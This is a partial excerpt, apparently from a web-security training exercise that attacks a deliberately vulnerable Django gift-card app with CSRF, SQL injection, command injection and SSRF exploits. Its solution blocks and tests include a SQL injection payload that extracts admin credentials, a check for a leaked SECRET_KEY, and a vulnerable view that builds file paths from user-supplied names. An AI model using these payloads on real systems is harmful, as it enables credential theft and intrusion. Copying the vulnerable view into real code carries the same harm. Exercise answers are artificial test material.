...
<details>
<summary>Python Environment Setup (skip if using devcintainer)</summary>
```bash
...
<details>
<summary>Hint: If you aren't sure what XSS is</summary>
...
<details>
<summary>Hint: Intermediate steps</summary>
...
def test_exploit_csrf_vulnerability(exploit_csrf_vulnerability):
    ...
    try:
        ...
        if final_card_count > initial_card_count:
            ...
            print("[+] CSRF Attack SUCCESS! New card created:")
            ...
            print("✓ New card added to user test2")
            ...
            print("    2. CSRF protection is working")
            print("    3. The endpoint requires different parameters")
    ...
    if "SOLUTION":
        ...
        for settings_file in settings_files:
            if os.path.exists(settings_file):
                ...
                csrf_settings = ["SESSION_COOKIE_SAMESITE = 'Strict'", "CSRF_COOKIE_SECURE = True"]
...
def exploit_sql_injection_vulnerability():
    ...
    if "SOLUTION":
        ...
        sql_injection_payload = (
            "' UNION SELECT id || '-' || username || '-' || password FROM LegacySite_user WHERE username='admin' -- "
        )
        ...
        card_data = {
            ...
            "customer_id": "test2",
            "total_value": 500,
            "records": [{"record_type": "amount_change", "amount_added": 2000, "signature": sql_injection_payload}],
        }
...
def test_exploit_sql_injection_vulnerability(exploit_sql_injection_vulnerability):
    ...
    try:
        ...
        print("Attempting SQL injection via card upload...")

        try:
            # Upload the card through the use_card_view
            response = client.post(
                "/use.html", {"card_supplied": "True", "card_fname": "test_sqli", "card_data": io.BytesIO(card_json)}
            )
        ...
        def use_card_view(request):
            ...
            if request.method == "GET":
                ...
                try:
                    ...
                    if card_fname is None or card_fname == "":
                        ...
                        card_file_path = os.path.join(
                            tempfile.gettempdir(), f"{card_fname}_{request.user.id}_parser.gftcrd"
                        )
                ...
                try:
                    ...
                    if (
                        not card_json.get("records")
                        or not isinstance(card_json["records"], list)
                        or len(card_json["records"]) == 0
                    ):
                ...
                for card in user_cards:
                    try:
                        ...
                        if "records" in card_data_dict and card_data_dict["records"][0]["signature"] == signature:
                ...
                if len(matching_cards) == 0:
                    ...
                    if card_fname is not None:
                        card_file_path = os.path.join(
                            tempfile.gettempdir(), f"{card_fname}_{request.user.id}_{user_card_count + 1}.gftcrd"
                        )
                    else:
                        card_file_path = os.path.join(
                            tempfile.gettempdir(), f"newcard_{request.user.id}_{user_card_count + 1}.gftcrd"
                        )
...
def test_exploit_cmd_injection_vulnerability(exploit_cmd_injection_vulnerability):
    ...
    try:
        ...
        print("Attempting command injection via card_fname parameter...")
...
def test_exploit_ssrf_vulnerability(exploit_ssrf_vulnerability):
    ...
    try:
        ...
        try:
            # Upload the card through the use_card_view
            response = client.post(
                "/use/", {"card_url_supplied": True, "card_url": card_url, "card_fname": "ssrf_test"}
            )
            ...
            if response.status_code == 200:
                ...
                if "SECRET_KEY" in response_content:
                    ...
                    print("[+] Leaked SECRET_KEY found in response")
